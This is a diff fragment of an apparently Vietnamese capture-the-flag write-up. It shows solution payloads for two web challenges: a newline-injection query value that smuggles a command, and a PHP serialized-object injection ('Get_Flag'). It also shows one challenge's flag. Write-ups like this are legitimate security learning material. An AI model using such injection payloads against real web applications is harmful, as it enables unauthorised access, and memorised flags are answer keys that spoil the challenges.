@@ -180,3 +180,9 @@ Sau một hồi đọc kết quả mà regex 101 đưa ra thì mình thấy rằ
 Payload: `?say=%0agive_me_the_flag`
 
 ### Flag: `FLAG{62e0d117-93af-4e36-957c-3841d1ae7100}`
+
+# Challenge 10
+
+### Solution
+
+Payload: `?get[flag.php=C:8:"Get_Flag":0:{}`
